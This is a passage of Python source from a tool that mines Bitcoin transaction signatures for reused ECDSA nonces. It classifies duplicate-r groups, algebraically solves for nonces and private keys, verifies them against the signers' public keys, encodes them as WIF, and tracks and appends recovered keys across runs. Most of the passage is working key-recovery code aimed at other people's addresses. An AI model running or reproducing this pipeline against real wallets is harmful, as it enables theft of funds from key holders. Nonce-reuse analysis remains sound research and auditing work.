    summary = recovery_material_summary(candidate_report, pre_validation, post_validation)
    payload = {
        "external_candidates": candidate_report,
        "pre_recover_validation": pre_validation,
        "post_recover_validation": post_validation,
        "preloaded_recovered_validation": summary["preloaded_recovered_validation"],
        "key_recovered": summary["key_recovered"],
        "new_key_recovered": summary["new_key_recovered"],
        "valid_recovered_material_present": summary["valid_recovered_material_present"],
        "recovery_outcome": summary["recovery_outcome"],
        "no_new_key_reason": summary["no_new_key_reason"],
        "new_local_recovered_rows": summary["new_local_recovered_rows"],
        "key_material_present": summary["key_material_present"],
        "pre_existing_valid_recovered_rows": summary["pre_existing_valid_recovered_rows"],
        "preloaded_valid_recovered_rows": summary["preloaded_valid_recovered_rows"],
        "cycle_valid_recovered_rows": summary["cycle_valid_recovered_rows"],
        "total_valid_recovered_rows": summary["total_valid_recovered_rows"],
        "priv_material": "LOCAL_ARTIFACT_ONLY",
    }
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, indent=2), encoding="utf-8")


def recovery_material_summary(
    candidate_report: dict[str, Any],
    pre_validation: dict[str, Any],
    post_validation: dict[str, Any],
) -> dict[str, Any]:
    """Summarize newly emitted and preloaded recovered-key artifacts.

    Cycle-local output may be empty when all known keys were supplied via
    --preload-recovered-json. Treat those preloaded rows as available local
    material, but keep the "new_local_recovered_rows" metric strict.
    """
    pre_valid_rows = int(pre_validation.get("valid_rows", 0) or 0)
    post_valid_rows = int(post_validation.get("valid_rows", 0) or 0)
    new_valid_rows = max(0, post_valid_rows - pre_valid_rows)

    preload_meta = candidate_report.get("preload_recovered_json") or {}
    preload_validation: dict[str, Any] = {
        "exists": False,
        "rows": 0,
        "valid_rows": 0,
        "invalid_rows": 0,
    }
    preload_path = preload_meta.get("path")
    if preload_path and not preload_meta.get("missing"):
        preload_validation = post_validate_recovered(Path(preload_path))

    preloaded_valid_rows = int(preload_validation.get("valid_rows", 0) or 0)
    total_available = post_valid_rows + preloaded_valid_rows
    if new_valid_rows > 0:
        recovery_outcome = "new_key_recovered"
        no_new_key_reason = None
    elif total_available > 0:
        recovery_outcome = "known_material_available"
        no_new_key_reason = "only_preexisting_or_preloaded_valid_material"
    else:
        recovery_outcome = "no_valid_recovered_material"
        no_new_key_reason = "no_candidate_validated"
    return {
        "key_recovered": new_valid_rows > 0,
        "new_key_recovered": new_valid_rows > 0,
        "valid_recovered_material_present": total_available > 0,
        "recovery_outcome": recovery_outcome,
        "no_new_key_reason": no_new_key_reason,
        "new_local_recovered_rows": new_valid_rows,
        "key_material_present": total_available > 0,
        "pre_existing_valid_recovered_rows": pre_valid_rows,
        "preloaded_valid_recovered_rows": preloaded_valid_rows,
        "cycle_valid_recovered_rows": post_valid_rows,
        "total_valid_recovered_rows": total_available,
        "preloaded_recovered_validation": preload_validation,
    }


def normalize_pubkey_hex(value: str) -> str:
    s = (value or "").strip().lower()
    if s.startswith("0x"):
        s = s[2:]
    return s


def pubkey_hex_variants(value: str) -> set[str]:
    """Return compressed/uncompressed SEC encodings for a pubkey hex string."""
    pub = normalize_pubkey_hex(value)
    if not pub:
        return set()
    if len(pub) not in {66, 130} or any(c not in "0123456789abcdef" for c in pub):
        raise ValueError("pubkey must be a compressed or uncompressed SEC pubkey hex string")
    variants = {pub}
    try:
        from coincurve import PublicKey  # type: ignore
        key = PublicKey(bytes.fromhex(pub))
        variants.add(key.format(compressed=True).hex())
        variants.add(key.format(compressed=False).hex())
    except Exception:
        # Keep validation permissive when coincurve is unavailable; exact-form
        # matching still works and audit verification will report dependency gaps.
        pass
    return variants


def build_target_pubkey_subset(sig_path: Path, target_pubkey: str, out_path: Path) -> dict[str, Any]:
    targets = pubkey_hex_variants(target_pubkey)
    if not targets:
        return {"enabled": False}
    target = normalize_pubkey_hex(target_pubkey)

    total_rows = 0
    matched_rows = 0
    skipped_bad_json = 0
    missing_pubkey = 0
    unique_tx_inputs: set[tuple[str, str]] = set()

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with sig_path.open("r", encoding="utf-8") as src, out_path.open("w", encoding="utf-8") as out:
        for line in src:
            raw = line.strip()
            if not raw:
                continue
            total_rows += 1
            try:
                obj = json.loads(raw)
            except Exception:
                skipped_bad_json += 1
                continue
            if not isinstance(obj, dict):
                skipped_bad_json += 1
                continue
            pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
            if not pub:
                missing_pubkey += 1
                continue
            if pub not in targets:
                continue
            out.write(raw + "\n")
            matched_rows += 1
            txid = str(obj.get("txid") or "")
            vin = str(obj.get("vin") if obj.get("vin") is not None else obj.get("input_index") or "")
            if txid:
                unique_tx_inputs.add((txid, vin))

    return {
        "enabled": True,
        "target_pubkey": target,
        "target_pubkey_variants": sorted(targets),
        "source": str(sig_path),
        "output": str(out_path),
        "total_rows": total_rows,
        "matched_rows": matched_rows,
        "unique_tx_inputs": len(unique_tx_inputs),
        "missing_pubkey_rows": missing_pubkey,
        "skipped_bad_json_rows": skipped_bad_json,
    }


def build_duplicate_r_focus_subset(
    sig_path: Path,
    out_path: Path,
    recoverable_out_path: Path | None = None,
    replay_out_path: Path | None = None,
    report_path: Path | None = None,
) -> dict[str, Any]:
    rows_by_r: dict[int, list[tuple[str, dict[str, Any]]]] = defaultdict(list)
    with sig_path.open("r", encoding="utf-8") as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
                if not isinstance(obj, dict):
                    continue
                r = parse_int(obj.get("r"))
            except Exception:
                continue
            rows_by_r[r].append((raw, obj))

    dup_groups = {r: rows for r, rows in rows_by_r.items() if len(rows) > 1}
    selected = 0
    nontrivial_groups = 0
    exact_replay_groups = 0
    same_r_same_s_diff_z_groups = 0
    same_r_diff_s_groups = 0
    nontrivial_selected = 0
    recoverable_selected = 0
    replay_selected = 0
    cross_pub_groups = 0
    report_groups: list[dict[str, Any]] = []

    out_path.parent.mkdir(parents=True, exist_ok=True)
    recoverable_out = None
    replay_out = None
    try:
        if recoverable_out_path is not None:
            recoverable_out_path.parent.mkdir(parents=True, exist_ok=True)
            recoverable_out = recoverable_out_path.open("w", encoding="utf-8")
        if replay_out_path is not None:
            replay_out_path.parent.mkdir(parents=True, exist_ok=True)
            replay_out = replay_out_path.open("w", encoding="utf-8")
        with out_path.open("w", encoding="utf-8") as out:
            for r_value, rows in dup_groups.items():
                s_set = set()
                z_set = set()
                uniq_sz = set()
                pub_set = set()
                tx_inputs = set()
                for _, obj in rows:
                    try:
                        sv = parse_int(obj.get("s"))
                        zv = parse_int(obj.get("z"))
                        s_set.add(sv)
                        z_set.add(zv)
                        uniq_sz.add((sv, zv))
                    except Exception:
                        pass
                    pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
                    if pub:
                        pub_set.add(pub)
                    txid = str(obj.get("txid") or "")
                    vin = str(obj.get("vin") if obj.get("vin") is not None else obj.get("input_index") or "")
                    if txid:
                        tx_inputs.add((txid, vin))

                is_nontrivial = False
                group_kind = "unknown"
                if len(uniq_sz) == 1:
                    exact_replay_groups += 1
                    group_kind = "exact_replay"
                elif len(s_set) == 1 and len(z_set) > 1:
                    same_r_same_s_diff_z_groups += 1
                    nontrivial_groups += 1
                    is_nontrivial = True
                    group_kind = "same_r_same_s_diff_z"
                elif len(s_set) > 1:
                    same_r_diff_s_groups += 1
                    nontrivial_groups += 1
                    is_nontrivial = True
                    group_kind = "same_r_diff_s"
                else:
                    nontrivial_groups += 1
                    is_nontrivial = True
                    group_kind = "nontrivial_unknown"

                if len(pub_set) > 1:
                    cross_pub_groups += 1

                # Nontrivial duplicate-r is the direct algebraic recovery path.
                # Cross-pub duplicate-r remains high-value evidence even when
                # same-r/s rows are replay-like, so keep it in recoverable focus.
                is_recoverable_focus = is_nontrivial or len(pub_set) > 1

                report_groups.append(
                    {
                        "r": format(r_value, "064x"),
                        "kind": group_kind,
                        "rows": len(rows),
                        "unique_s": len(s_set),
                        "unique_z": len(z_set),
                        "unique_pubkeys": len(pub_set),
                        "unique_tx_inputs": len(tx_inputs),
                        "recoverable_focus": is_recoverable_focus,
                    }
                )

                for raw, _ in rows:
                    out.write(raw + "\n")
                    selected += 1
                    if is_nontrivial:
                        nontrivial_selected += 1
                    if is_recoverable_focus:
                        recoverable_selected += 1
                        if recoverable_out is not None:
                            recoverable_out.write(raw + "\n")
                    else:
                        replay_selected += 1
                        if replay_out is not None:
                            replay_out.write(raw + "\n")
    finally:
        if recoverable_out is not None:
            recoverable_out.close()
        if replay_out is not None:
            replay_out.close()

    report_groups.sort(
        key=lambda x: (
            bool(x.get("recoverable_focus")),
            int(x.get("unique_pubkeys", 0)),
            int(x.get("unique_s", 0)),
            int(x.get("rows", 0)),
        ),
        reverse=True,
    )
    if report_path is not None:
        report_path.parent.mkdir(parents=True, exist_ok=True)
        report_payload = {
            "input": str(sig_path),
            "all_duplicate_rows_out": str(out_path),
            "recoverable_rows_out": str(recoverable_out_path) if recoverable_out_path else None,
            "replay_rows_out": str(replay_out_path) if replay_out_path else None,
            "duplicate_r_groups": len(dup_groups),
            "recoverable_focus_groups": sum(1 for g in report_groups if g["recoverable_focus"]),
            "recoverable_focus_rows": recoverable_selected,
            "replay_like_rows": replay_selected,
            "cross_pub_duplicate_r_groups": cross_pub_groups,
            "groups": report_groups[:500],
        }
        report_path.write_text(json.dumps(report_payload, indent=2), encoding="utf-8")

    return {
        "duplicate_r_groups": len(dup_groups),
        "nontrivial_duplicate_r_groups": nontrivial_groups,
        "exact_replay_groups": exact_replay_groups,
        "same_r_same_s_diff_z_groups": same_r_same_s_diff_z_groups,
        "same_r_diff_s_groups": same_r_diff_s_groups,
        "cross_pub_duplicate_r_groups": cross_pub_groups,
        "selected_signatures": selected,
        "selected_signatures_nontrivial": nontrivial_selected,
        "selected_signatures_recoverable_focus": recoverable_selected,
        "selected_signatures_replay_like": replay_selected,
        "output": str(out_path),
        "recoverable_output": str(recoverable_out_path) if recoverable_out_path else None,
        "replay_output": str(replay_out_path) if replay_out_path else None,
        "classification_report": str(report_path) if report_path else None,
    }


def _safe_row_id(obj: dict[str, Any], idx: int) -> dict[str, Any]:
    return {
        "index": idx,
        "txid": str(obj.get("txid") or "")[:16],
        "vin": obj.get("vin", obj.get("input_index")),
        "pubkey_prefix": normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))[:20],
    }


def _extract_der_and_sighash(sig_hex: str) -> tuple[bytes | None, int | None, str | None]:
    if not sig_hex:
        return None, None, "missing_signature_hex"
    try:
        b = bytes.fromhex(sig_hex)
    except Exception:
        return None, None, "bad_signature_hex"
    if len(b) < 8 or b[0] != 0x30:
        return None, None, "not_der"
    if len(b) >= 2 and (2 + b[1]) == len(b):
        return b, None, None
    if len(b) >= 3 and (2 + b[1]) == len(b) - 1:
        return b[:-1], b[-1], None
    return None, b[-1] if b else None, "bad_der_length"


def _parse_der_rs(der: bytes | None) -> tuple[int | None, int | None, str | None]:
    if not der:
        return None, None, "missing_der"
    try:
        if len(der) < 8 or der[0] != 0x30:
            return None, None, "not_sequence"
        pos = 2
        if der[pos] != 0x02:
            return None, None, "missing_r_integer"
        r_len = der[pos + 1]
        r_bytes = der[pos + 2:pos + 2 + r_len]
        pos += 2 + r_len
        if pos + 2 > len(der) or der[pos] != 0x02:
            return None, None, "missing_s_integer"
        s_len = der[pos + 1]
        s_bytes = der[pos + 2:pos + 2 + s_len]
        if pos + 2 + s_len != len(der):
            return None, None, "trailing_der_bytes"
        return int.from_bytes(r_bytes, "big"), int.from_bytes(s_bytes, "big"), None
    except Exception as e:
        return None, None, f"der_parse_exception:{type(e).__name__}"


def _verify_row_signature(obj: dict[str, Any]) -> tuple[bool | None, str]:
    pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
    sig_hex = str(obj.get("signature_hex") or obj.get("sig") or "")
    if not pub:
        return None, "missing_pubkey"
    try:
        z = parse_int(obj.get("z"))
        if not (0 <= z < 2**256):
            return None, "z_out_of_256_bit_range"
    except Exception:
        return None, "bad_z"
    der, _, der_reason = _extract_der_and_sighash(sig_hex)
    if der is None:
        return None, der_reason or "bad_der"
    try:
        from coincurve import PublicKey  # type: ignore
        ok = bool(PublicKey(bytes.fromhex(pub)).verify(der, z.to_bytes(32, "big"), hasher=None))
        return ok, "ok" if ok else "verify_false"
    except ValueError:
        return False, "pubkey_parse_error"
    except Exception as e:
        return False, f"verify_exception:{type(e).__name__}"


def _recompute_z_from_context(obj: dict[str, Any]) -> tuple[bool | None, str]:
    ctx = obj.get("sighash_context")
    if not isinstance(ctx, dict):
        return None, "missing_sighash_context"
    try:
        from download_signatures import bip143_sighash, legacy_sighash  # type: ignore
        vin_index = int(ctx.get("vin_index", obj.get("vin", 0)))
        script_code = str(ctx.get("script_code") or obj.get("script_code") or "")
        if not script_code:
            return None, "missing_script_code"
        sighash = int(obj.get("sighash"))
        tx = {
            "version": int(ctx.get("version", 2)),
            "locktime": int(ctx.get("locktime", 0)),
            "vin": [
                {
                    "txid": str(inp.get("txid") or ""),
                    "vout": int(inp.get("vout", 0)),
                    "sequence": int(inp.get("sequence", 0xffffffff)),
                }
                for inp in (ctx.get("inputs") or [])
                if isinstance(inp, dict)
            ],
            "vout": [
                {
                    "value": int(out.get("value", 0)),
                    "scriptpubkey": str(out.get("scriptpubkey") or ""),
                }
                for out in (ctx.get("outputs") or [])
                if isinstance(out, dict)
            ],
        }
        if not tx["vin"] or vin_index < 0 or vin_index >= len(tx["vin"]):
            return None, "bad_context_inputs"
        algorithm = str(ctx.get("algorithm") or "").lower()
        if algorithm == "bip143":
            z_calc = bip143_sighash(tx, vin_index, int(ctx.get("prev_value", obj.get("prev_value", 0))), script_code, sighash)
        elif algorithm == "legacy":
            z_calc = legacy_sighash(tx, vin_index, script_code, sighash)
        else:
            return None, "unknown_sighash_algorithm"
        z_row = parse_int(obj.get("z"))
        return z_calc == z_row, "z_recompute_match" if z_calc == z_row else "z_recompute_mismatch"
    except Exception as e:
        return None, f"z_recompute_exception:{type(e).__name__}"


def _derived_pubkey_matches(d: int, pubkeys: set[str]) -> tuple[bool | None, str]:
    if not pubkeys:
        return None, "missing_pubkey"
    try:
        from coincurve import PrivateKey  # type: ignore
        pk = PrivateKey(d.to_bytes(32, "big"))
        compressed = pk.public_key.format(compressed=True).hex()
        uncompressed = pk.public_key.format(compressed=False).hex()
        return bool({compressed, uncompressed} & pubkeys), "ok"
    except Exception as e:
        return None, f"derive_pubkey_exception:{type(e).__name__}"


def derived_pubkey_variants_from_priv(d: int) -> set[str]:
    """Return SEC compressed/uncompressed pubkeys for a local private scalar."""
    if not (1 <= int(d) < SECP256K1_N):
        return set()
    try:
        from coincurve import PrivateKey  # type: ignore
        pk = PrivateKey(int(d).to_bytes(32, "big"))
        return {
            pk.public_key.format(compressed=True).hex(),
            pk.public_key.format(compressed=False).hex(),
        }
    except Exception:
        return set()


def build_duplicate_r_pair_diagnostics(
    sig_path: Path,
    out_path: Path,
    max_groups: int = 500,
    max_pair_samples: int = 200,
) -> dict[str, Any]:
    """Explain duplicate-r recoverability without writing d/k material.

    Full Bitcoin sighash reconstruction is intentionally marked as not available
    unless raw tx/preimage data exists in the row. Local checks still catch the
    common blockers: bad DER, row r/s mismatch, bad z shape, invalid signature,
    cross-pub pairs, non-invertible denominators, and derived-pubkey mismatch.
    """
    rows_by_r: dict[int, list[tuple[int, dict[str, Any]]]] = defaultdict(list)
    row_count = 0
    malformed_rows = 0
    row_reason_counts: Counter[str] = Counter()
    with sig_path.open("r", encoding="utf-8") as f:
        for idx, line in enumerate(f):
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
                if not isinstance(obj, dict):
                    malformed_rows += 1
                    continue
                r = parse_int(obj.get("r"))
                rows_by_r[r].append((idx, obj))
                row_count += 1
            except Exception:
                malformed_rows += 1

    groups = [(r, rows) for r, rows in rows_by_r.items() if len(rows) > 1]
    groups.sort(key=lambda item: len(item[1]), reverse=True)
    groups = groups[:max_groups]

    pair_reason_counts: Counter[str] = Counter()
    row_verification_counts: Counter[str] = Counter()
    z_recompute_counts: Counter[str] = Counter()
    z_recompute_by_context_source: Counter[str] = Counter()
    trusted_z_recompute_counts: Counter[str] = Counter()
    untrusted_z_recompute_counts: Counter[str] = Counter()
    group_reports: list[dict[str, Any]] = []
    pair_samples: list[dict[str, Any]] = []
    total_pairs = 0
    direct_candidate_pairs = 0
    direct_valid_pairs = 0
    cross_pub_pairs = 0

    for r, rows in groups:
        group_pair_reasons: Counter[str] = Counter()
        group_valid = 0
        group_direct = 0
        try:
            r_inv = pow(r, -1, SECP256K1_N) if 1 <= r < SECP256K1_N else None
        except ValueError:
            r_inv = None
        row_summaries = []
        for idx, obj in rows:
            row_reasons = []
            try:
                row_r = parse_int(obj.get("r"))
                row_s = parse_int(obj.get("s"))
                row_z = parse_int(obj.get("z"))
            except Exception:
                row_reasons.append("bad_numeric_field")
                row_reason_counts["bad_numeric_field"] += 1
                row_summaries.append({**_safe_row_id(obj, idx), "reasons": row_reasons})
                continue
            sig_hex = str(obj.get("signature_hex") or obj.get("sig") or "")
            der, sighash_byte, der_reason = _extract_der_and_sighash(sig_hex)
            der_r, der_s, parse_reason = _parse_der_rs(der)
            if der_reason:
                row_reasons.append(der_reason)
            if parse_reason:
                row_reasons.append(parse_reason)
            if der_r is not None and der_r != row_r:
                row_reasons.append("der_r_mismatch")
            if der_s is not None and der_s != row_s:
                # Low-S normalization can intentionally change row s. Keep it
                # distinct from a hard mismatch for debugging.
                if (SECP256K1_N - der_s) % SECP256K1_N == row_s:
                    row_reasons.append("row_s_is_low_s_normalized")
                else:
                    row_reasons.append("der_s_mismatch")
            if sighash_byte is not None and obj.get("sighash") is not None:
                try:
                    if int(obj.get("sighash")) != int(sighash_byte):
                        row_reasons.append("sighash_byte_mismatch")
                except Exception:
                    row_reasons.append("bad_sighash_field")
            if not (0 <= row_z < 2**256):
                row_reasons.append("z_out_of_256_bit_range")
            ok, verify_reason = _verify_row_signature(obj)
            row_verification_counts[verify_reason] += 1
            if ok is False:
                row_reasons.append(f"signature_{verify_reason}")
            z_ok, z_reason = _recompute_z_from_context(obj)
            z_recompute_counts[z_reason] += 1
            ctx_source = str(obj.get("sighash_context_source") or "unknown")
            z_recompute_by_context_source[f"{ctx_source}:{z_reason}"] += 1
            if ctx_source == "extraction_match":
                trusted_z_recompute_counts[z_reason] += 1
            elif ctx_source == "row_fallback_unverified":
                untrusted_z_recompute_counts[z_reason] += 1
            if z_ok is False:
                if ctx_source == "row_fallback_unverified":
                    row_reasons.append(f"{z_reason}_untrusted_context")
                else:
                    row_reasons.append(z_reason)
            for reason in row_reasons:
                row_reason_counts[reason] += 1
            row_summaries.append(
                {
                    **_safe_row_id(obj, idx),
                    "signature_verification": verify_reason,
                    "z_recompute": z_reason,
                    "sighash_context_source": ctx_source,
                    "sighash_byte": sighash_byte,
                    "row_sighash": obj.get("sighash"),
                    "reasons": row_reasons,
                }
            )

        for a in range(len(rows)):
            i1, x1 = rows[a]
            for b in range(a + 1, len(rows)):
                i2, x2 = rows[b]
                total_pairs += 1
                try:
                    s1, s2 = parse_int(x1.get("s")), parse_int(x2.get("s"))
                    z1, z2 = parse_int(x1.get("z")), parse_int(x2.get("z"))
                except Exception:
                    reason = "bad_numeric_field"
                    pair_reason_counts[reason] += 1
                    group_pair_reasons[reason] += 1
                    continue
                pub1 = normalize_pubkey_hex(str(x1.get("pubkey_hex") or x1.get("pub") or ""))
                pub2 = normalize_pubkey_hex(str(x2.get("pubkey_hex") or x2.get("pub") or ""))
                if pub1 and pub2 and pub1 != pub2:
                    reason = "cross_pub_pair_not_directly_solvable"
                    cross_pub_pairs += 1
                    pair_reason_counts[reason] += 1
                    group_pair_reasons[reason] += 1
                    if len(pair_samples) < max_pair_samples:
                        pair_samples.append({"r": format(r, "064x"), "reason": reason, "rows": [_safe_row_id(x1, i1), _safe_row_id(x2, i2)]})
                    continue
                if z1 == z2:
                    reason = "same_z_no_nonce_reuse_signal"
                    pair_reason_counts[reason] += 1
                    group_pair_reasons[reason] += 1
                    continue
                direct_candidate_pairs += 1
                group_direct += 1
                branch_results: list[str] = []
                valid_branch = ""
                for branch, denom in (
                    ("same_k", (s1 - s2) % SECP256K1_N),
                    ("negated_k", (s1 + s2) % SECP256K1_N),
                ):
                    if denom == 0 or r_inv is None:
                        branch_results.append(f"{branch}:bad_inverse")
                        continue
                    k = ((z1 - z2) % SECP256K1_N) * pow(denom, -1, SECP256K1_N) % SECP256K1_N
                    if k == 0:
                        branch_results.append(f"{branch}:zero_k")
                        continue
                    k2 = k if branch == "same_k" else (-k) % SECP256K1_N
                    if k2 == 0:
                        branch_results.append(f"{branch}:zero_k2")
                        continue
                    d = (((s1 * k - z1) % SECP256K1_N) * r_inv) % SECP256K1_N
                    lhs1 = (s1 * k - z1) % SECP256K1_N
                    lhs2 = (s2 * k2 - z2) % SECP256K1_N
                    rhs = (r * d) % SECP256K1_N
                    if lhs1 != rhs or lhs2 != rhs:
                        branch_results.append(f"{branch}:algebraic_equation_failed")
                        continue
                    match, match_reason = _derived_pubkey_matches(d, {p for p in (pub1, pub2) if p})
                    if match:
                        valid_branch = branch
                        break
                    if match is False:
                        branch_results.append(f"{branch}:derived_pubkey_mismatch")
                    else:
                        branch_results.append(f"{branch}:{match_reason}")
                if valid_branch:
                    reason = f"direct_recovery_valid_{valid_branch}"
                    direct_valid_pairs += 1
                    group_valid += 1
                else:
                    reason = "direct_recovery_failed_all_branches"
                pair_reason_counts[reason] += 1
                group_pair_reasons[reason] += 1
                if len(pair_samples) < max_pair_samples:
                    pair_samples.append({
                        "r": format(r, "064x"),
                        "reason": reason,
                        "branch_results": branch_results,
                        "rows": [_safe_row_id(x1, i1), _safe_row_id(x2, i2)],
                    })

        pubs = {
            normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
            for _, obj in rows
            if normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
        }
        group_reports.append(
            {
                "r": format(r, "064x"),
                "rows": len(rows),
                "unique_pubkeys": len(pubs),
                "pairs_total": len(rows) * (len(rows) - 1) // 2,
                "direct_candidate_pairs": group_direct,
                "direct_valid_pairs": group_valid,
                "pair_reason_counts": dict(group_pair_reasons),
                "row_summaries": row_summaries[:20],
            }
        )

    payload = {
        "input": str(sig_path),
        "rows": row_count,
        "malformed_rows": malformed_rows,
        "duplicate_r_groups": len(groups),
        "pairs_total": total_pairs,
        "direct_candidate_pairs": direct_candidate_pairs,
        "direct_valid_pairs": direct_valid_pairs,
        "cross_pub_pairs": cross_pub_pairs,
        "pair_reason_counts": dict(pair_reason_counts),
        "row_reason_counts": dict(row_reason_counts),
        "row_verification_counts": dict(row_verification_counts),
        "z_recompute_counts": dict(z_recompute_counts),
        "z_recompute_by_context_source": dict(z_recompute_by_context_source),
        "trusted_z_recompute_counts": dict(trusted_z_recompute_counts),
        "untrusted_z_recompute_counts": dict(untrusted_z_recompute_counts),
        "sighash_reconstruction": {
            "available": bool(z_recompute_counts and any(k in z_recompute_counts for k in ("z_recompute_match", "z_recompute_mismatch"))),
            "trusted_context_source": "extraction_match",
            "untrusted_context_source": "row_fallback_unverified",
            "reason": "z is recomputed for rows carrying sighash_context; extraction_match is authoritative, row_fallback_unverified is diagnostic only",
            "required_fields": ["sighash_context.version", "sighash_context.locktime", "sighash_context.inputs", "sighash_context.outputs", "sighash_context.script_code", "sighash"],
        },
        "groups": group_reports,
        "pair_samples": pair_samples,
        "priv_material": "NOT_WRITTEN",
    }
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def summarize_duplicate_r_pair_diagnostics(report: dict[str, Any]) -> dict[str, Any]:
    if not report:
        return {}
    return {
        "input": report.get("input"),
        "rows": report.get("rows", 0),
        "duplicate_r_groups": report.get("duplicate_r_groups", 0),
        "pairs_total": report.get("pairs_total", 0),
        "direct_candidate_pairs": report.get("direct_candidate_pairs", 0),
        "direct_valid_pairs": report.get("direct_valid_pairs", 0),
        "cross_pub_pairs": report.get("cross_pub_pairs", 0),
        "pair_reason_counts": report.get("pair_reason_counts", {}),
        "row_verification_counts": report.get("row_verification_counts", {}),
        "z_recompute_counts": report.get("z_recompute_counts", {}),
        "z_recompute_by_context_source": report.get("z_recompute_by_context_source", {}),
        "trusted_z_recompute_counts": report.get("trusted_z_recompute_counts", {}),
        "untrusted_z_recompute_counts": report.get("untrusted_z_recompute_counts", {}),
        "sighash_reconstruction": report.get("sighash_reconstruction", {}),
    }


BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
SECP256K1_N = int("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16)


def b58decode(s: str) -> bytes:
    n = 0
    for ch in s:
        n = n * 58 + BASE58_ALPHABET.index(ch)
    b = n.to_bytes((n.bit_length() + 7) // 8, "big") if n else b""
    pad = 0
    for ch in s:
        if ch == "1":
            pad += 1
        else:
            break
    return b"\x00" * pad + b


def b58encode(raw: bytes) -> str:
    n = int.from_bytes(raw, "big")
    out = ""
    while n:
        n, rem = divmod(n, 58)
        out = BASE58_ALPHABET[rem] + out
    pad = 0
    for b in raw:
        if b == 0:
            pad += 1
        else:
            break
    return "1" * pad + (out or "")


def base58check_encode(payload: bytes) -> str:
    chk = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
    return b58encode(payload + chk)


def wif_from_priv_int(d: int, compressed: bool) -> str:
    payload = b"\x80" + int(d).to_bytes(32, "big")
    if compressed:
        payload += b"\x01"
    return base58check_encode(payload)


def parse_priv_candidate(x: str) -> int | None:
    s = x.strip()
    if not s:
        return None
    try:
        if s.startswith(("0x", "0X")):
            k = int(s, 16)
        elif len(s) in {51, 52} and all(ch in BASE58_ALPHABET for ch in s):
            raw = b58decode(s)
            if len(raw) not in {37, 38}:
                return None
            payload, chk = raw[:-4], raw[-4:]
            good = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
            if chk != good:
                return None
            if payload[0] not in (0x80, 0xEF):
                return None
            key = payload[1:33]
            if len(payload) == 34 and payload[-1] != 0x01:
                return None
            k = int.from_bytes(key, "big")
        elif all(c in "0123456789abcdefABCDEF" for c in s) and len(s) == 64:
            k = int(s, 16)
        else:
            k = int(s, 10)
    except Exception:
        return None
    if 1 <= k < SECP256K1_N:
        return k
    return None


def post_validate_recovered(path: Path) -> dict[str, Any]:
    if not path.exists():
        return {"exists": False, "rows": 0, "valid_rows": 0, "invalid_rows": 0}
    rows = 0
    valid = 0
    invalid = 0
    with path.open("r", encoding="utf-8") as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue
            rows += 1
            cand: str | None = None
            try:
                obj = json.loads(raw)
                if isinstance(obj, dict):
                    for k in ("wif", "priv_hex", "priv", "privkey", "private_key", "d"):
                        if k in obj and obj[k] is not None:
                            cand = str(obj[k])
                            break
            except Exception:
                cand = raw
            if cand is None:
                invalid += 1
            elif parse_priv_candidate(cand) is not None:
                valid += 1
            else:
                invalid += 1
    return {
        "exists": True,
        "rows": rows,
        "valid_rows": valid,
        "invalid_rows": invalid,
    }


def load_recovered_k_map(recovered_k_path: Path) -> tuple[dict[str, set[int]], dict[str, Any]]:
    k_by_r: dict[str, set[int]] = defaultdict(set)
    rows = 0
    bad_rows = 0
    if not recovered_k_path.exists():
        return k_by_r, {"exists": False, "rows": 0, "bad_rows": 0, "unique_r": 0, "unique_k": 0}
    with recovered_k_path.open("r", encoding="utf-8", errors="replace") as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue
            rows += 1
            try:
                obj = json.loads(raw)
                if not isinstance(obj, dict):
                    bad_rows += 1
                    continue
                r = parse_int(obj.get("r"))
                raw_ks: list[Any] = []
                if obj.get("k") is not None:
                    raw_ks.append(obj.get("k"))
                if isinstance(obj.get("k_candidates"), list):
                    raw_ks.extend(obj.get("k_candidates") or [])
                if not (1 <= r < SECP256K1_N) or not raw_ks:
                    bad_rows += 1
                    continue
                added = 0
                for raw_k in raw_ks:
                    try:
                        k = parse_int(raw_k)
                    except Exception:
                        continue
                    if 1 <= k < SECP256K1_N:
                        k_by_r[format(r, "064x")].add(int(k))
                        added += 1
                if added == 0:
                    bad_rows += 1
            except Exception:
                bad_rows += 1
    unique_k = sum(len(v) for v in k_by_r.values())
    return k_by_r, {
        "exists": True,
        "rows": rows,
        "bad_rows": bad_rows,
        "unique_r": len(k_by_r),
        "unique_k": unique_k,
    }


def load_existing_recovered_privs(path: Path) -> set[int]:
    out: set[int] = set()
    if not path.exists():
        return out
    with path.open("r", encoding="utf-8", errors="replace") as f:
        for line in f:
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
                if isinstance(obj, dict):
                    for key in ("priv_hex", "priv", "privkey", "private_key", "d", "wif", "wif_compressed", "wif_uncompressed"):
                        if obj.get(key) is None:
                            continue
                        d = parse_priv_candidate(str(obj.get(key)))
                        if d is not None:
                            out.add(int(d))
                            break
                    continue
            except Exception:
                pass
            d = parse_priv_candidate(raw)
            if d is not None:
                out.add(int(d))
    return out


def derive_recovered_keys_from_known_k(
    *,
    sig_path: Path,
    recovered_k_path: Path,
    recovered_json_path: Path,
    recovered_txt_path: Path,
    report_path: Path,
    max_rows: int = 0,
    known_r_rows_path: Path | None = None,
) -> dict[str, Any]:
    """Derive and locally append keys from confirmed nonce facts.

    For every signature sharing a recovered r->k, derive d=(s*k-z)/r mod n and
    accept it only when the derived public key matches the row pubkey. The report
